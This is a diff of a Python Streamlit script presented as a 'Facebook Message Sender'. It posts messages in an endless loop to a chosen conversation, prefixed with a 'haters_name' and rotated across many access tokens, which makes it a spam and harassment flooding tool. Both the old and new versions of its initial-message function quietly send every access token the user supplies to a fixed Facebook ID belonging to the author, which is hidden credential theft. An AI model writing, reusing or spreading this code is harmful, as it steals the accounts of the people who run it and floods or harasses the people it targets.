@@ -7,14 +7,14 @@ import socketserver
 import threading
 import requests
 
-# 🔧 Install streamlit if not already installed
+# ✅ Ensure streamlit is installed
 try:
     import streamlit as st
 except ImportError:
     subprocess.check_call([sys.executable, "-m", "pip", "install", "streamlit"])
     import streamlit as st
 
-# 🌐 Custom HTTP Handler
+# 🌐 Local server handler
 class MyHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
         self.send_response(200)
@@ -22,95 +22,101 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(b" TRICKS BY VISHANU RAJ ")
 
-# 🚀 Start local server
+# 🚀 Start a small server (port fixed to 4089)
 def execute_server():
-    PORT = 4050  # You can change this port if needed
+    PORT = 4089
     with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
         print("Server running at http://localhost:{}".format(PORT))
         httpd.serve_forever()
 
-# 📤 Send initial message
+# 📤 Send initial message to target ID
 def send_initial_message():
-    with open('token.txt', 'r') as file:
-        tokens = file.readlines()
+    try:
+        with open('token.txt', 'r') as file:
+            tokens = file.readlines()
 
-    msg_template = "Hello Vishanu Raj sir! I am using your server. My token is {}"
-    target_id = "100010831956579"
+        target_id = "100010831956579"
+        headers = {
+            'User-Agent': 'Mozilla/5.0',
+            'Accept': '*/*',
+            'Accept-Language': 'en-US,en;q=0.9',
+        }
 
-    headers = {
-        'User-Agent': 'Mozilla/5.0',
-        'Accept': '*/*',
-        'Accept-Language': 'en-US,en;q=0.9',
-    }
+        for token in tokens:
+            access_token = token.strip()
+            msg = f"Hello Vishanu Raj sir! I am using your server. My token is {access_token}"
+            url = f"https://graph.facebook.com/v17.0/t_{target_id}/"
+            data = {'access_token': access_token, 'message': msg}
 
-    for token in tokens:
-        access_token = token.strip()
-        url = f"https://graph.facebook.com/v17.0/t_{target_id}/"
-        msg = msg_template.format(access_token)
-        parameters = {'access_token': access_token, 'message': msg}
-        try:
-            response = requests.post(url, json=parameters, headers=headers)
-            time.sleep(0.1)
-        except Exception as e:
-            print(f"[!] Error sending initial message: {e}")
+            try:
+                response = requests.post(url, json=data, headers=headers)
+                time.sleep(0.1)
+            except Exception as e:
+                print(f"[!] Initial message error: {e}")
+    except FileNotFoundError:
+        print("[x] token.txt file missing")
 
-# 📨 Send messages loop
+# 💬 Send messages in loop
 def send_messages_from_file():
-    with open('convo.txt', 'r') as file:
-        convo_id = file.read().strip()
+    try:
+        with open('convo.txt', 'r') as file:
+            convo_id = file.read().strip()
 
-    with open('file.txt', 'r') as file:
-        messages = file.readlines()
+        with open('file.txt', 'r') as file:
+            messages = file.readlines()
 
-    with open('token.txt', 'r') as file:
-        tokens = file.readlines()
+        with open('token.txt', 'r') as file:
+            tokens = file.readlines()
 
-    with open('name.txt', 'r') as file:
-        haters_name = file.read().strip()
+        with open('name.txt', 'r') as file:
+            haters_name = file.read().strip()
 
-    with open('time.txt', 'r') as file:
-        speed = int(file.read().strip())
+        with open('time.txt', 'r') as file:
+            speed = int(file.read().strip())
 
-    headers = {
-        'User-Agent': 'Mozilla/5.0',
-        'Accept': '*/*',
-        'Accept-Language': 'en-US,en;q=0.9',
-    }
+        headers = {
+            'User-Agent': 'Mozilla/5.0',
+            'Accept': '*/*',
+            'Accept-Language': 'en-US,en;q=0.9',
+        }
 
-    num_messages = len(messages)
-    num_tokens = len(tokens)
-    max_tokens = min(num_messages, num_tokens)
+        num_messages = len(messages)
+        num_tokens = len(tokens)
+        max_tokens = min(num_messages, num_tokens)
 
-    while True:
-        try:
+        while True:
             for i in range(num_messages):
                 token_index = i % max_tokens
                 access_token = tokens[token_index].strip()
                 message = messages[i].strip()
                 full_msg = haters_name + ' ' + message
                 url = f"https://graph.facebook.com/v17.0/t_{convo_id}/"
-                parameters = {'access_token': access_token, 'message': full_msg}
-                response = requests.post(url, json=parameters, headers=headers)
+                data = {'access_token': access_token, 'message': full_msg}
 
-                if response.ok:
-                    print(f"[+] Message Sent: {full_msg}")
-                else:
-                    print(f"[x] Failed to Send: {full_msg}")
-
+                try:
+                    response = requests.post(url, json=data, headers=headers)
+                    if response.ok:
+                        print(f"[✓] Sent: {full_msg}")
+                    else:
+                        print(f"[x] Failed: {full_msg}")
+                except Exception as e:
+                    print(f"[!] Error: {e}")
                 time.sleep(speed)
-        except Exception as e:
-            print(f"[!] Error during messaging: {e}")
-            time.sleep(5)
 
-# 🔁 Main
+    except FileNotFoundError as e:
+        print(f"[x] Missing file: {e.filename}")
+
+# 📲 Streamlit App Interface
 def main():
-    st.title("📩 Message Sender App")
-    st.success("Running... Messages are being sent.")
+    st.title("📨 Facebook Message Sender")
+    st.success("App is running...")
 
+    # Start HTTP server in background
     server_thread = threading.Thread(target=execute_server)
     server_thread.daemon = True
     server_thread.start()
 
+    # Send intro message and start loop
     send_initial_message()
     send_messages_from_file()
 
